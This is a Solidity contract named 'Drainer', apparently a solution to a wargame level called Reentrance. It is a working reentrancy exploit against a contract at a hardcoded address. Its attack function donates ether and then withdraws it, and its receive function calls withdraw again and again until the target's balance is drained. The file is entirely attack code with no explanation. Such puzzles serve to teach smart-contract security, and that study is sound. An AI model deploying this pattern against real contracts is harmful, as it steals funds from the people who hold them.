// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel10.sol";

contract Drainer {
    Reentrance target = Reentrance(payable(0x4f8c95cB88D378d982A611D7e761251039b5Be76));

    modifier targetHasBalance() {
        require(address(target).balance == msg.value);
        _;
    }

    function attack() public payable targetHasBalance {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        target.withdraw(msg.value);
    }
}
